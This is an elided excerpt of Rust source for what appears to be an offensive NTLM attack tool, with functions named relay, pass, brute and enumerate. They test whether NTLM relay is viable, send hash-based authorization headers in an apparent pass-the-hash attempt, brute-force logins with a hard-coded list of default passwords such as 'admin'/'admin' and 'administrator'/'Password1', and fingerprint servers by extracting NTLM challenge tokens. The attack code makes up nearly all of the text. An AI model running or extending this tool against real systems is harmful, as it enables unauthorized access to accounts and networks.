...
pub async fn relay(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    for (name, target) in &relay_targets {
        let ntlm_msg = format!("TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==");
        match client.get(url).header("Authorization", format!("NTLM {}", ntlm_msg)).header("X-Relay-Target", *target).send().await {
            Ok(r) => {
                let s = r.status().as_u16();
                let auth = r.headers().get("www-authenticate").map(|v| v.to_str().unwrap_or("")).unwrap_or("");
                if s == 401 && auth.contains("NTLM") {
                    println!("  {} {:15} — NTLM challenge received (relay viable)", "[!]".red().bold(), name);
                } else {
...
pub async fn pass(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    for (name, hash) in &hashes {
        let auth_header = format!("NTLM {}:{}", "TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==", hash);
...
pub async fn brute(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    let client = build_client(timeout);
    let creds = [
        ("admin", "admin"), ("admin", "password"), ("admin", "P@ssw0rd"),
        ("administrator", "Password1"), ("administrator", "Welcome1"),
        ("user", "user"), ("user", "password"), ("user", "123456"),
        ("guest", "guest"), ("guest", ""), ("svc", "SVCpass123"),
        ("sql", "Sqlpass123"), ("backup", "Backup123"),
    ];
...
pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    match client.get(url).header("Authorization", &format!("NTLM {}", ntlm_type1)).send().await {
        Ok(r) => {
            let status = r.status().as_u16();
            let headers = r.headers().clone();
            let auth = headers.get("www-authenticate").map(|v| v.to_str().unwrap_or("").to_string()).unwrap_or_default();
            ...
            if auth.contains("NTLM") {
                ...
                if let Some(start) = auth.find("TlRMTVNTUAAC") {
                    ...
                    println!("  Challenge token: {}...", &challenge[..challenge.len().min(48)]);
                    println!("  {} Server supports NTLM authentication", "[+]".green().bold());
                }
            }
            let server = headers.get("server").map(|v| v.to_str().unwrap_or("")).unwrap_or("");
            if !server.is_empty() {
    ...
    let info_endpoints = ["/api/info", "/api/version", "/.well-known/security.txt", "/robots.txt"];
